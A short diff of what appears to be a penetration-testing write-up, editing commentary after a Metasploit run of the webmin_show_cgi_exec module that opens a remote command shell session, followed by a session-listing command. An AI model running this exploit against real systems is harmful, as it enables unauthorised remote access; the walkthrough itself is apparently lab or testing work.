@@ -340,7 +340,7 @@ msf exploit(unix/webapp/webmin_show_cgi_exec) > run
 [*] Command shell session 2 opened (192.168.159.255:4444 -> 10.49.181.12:49772) at 2026-04-29 14:25:31 +1000
 [*] Session 2 created in the background.
 ```
-Success!
+Success! And here is where I found two sessions were successful. But start by looking at the last one created. I cirle back to first one after that and discover it actually worked as well.
 ```
 msf exploit(unix/webapp/webmin_show_cgi_exec) > sessions -l
 
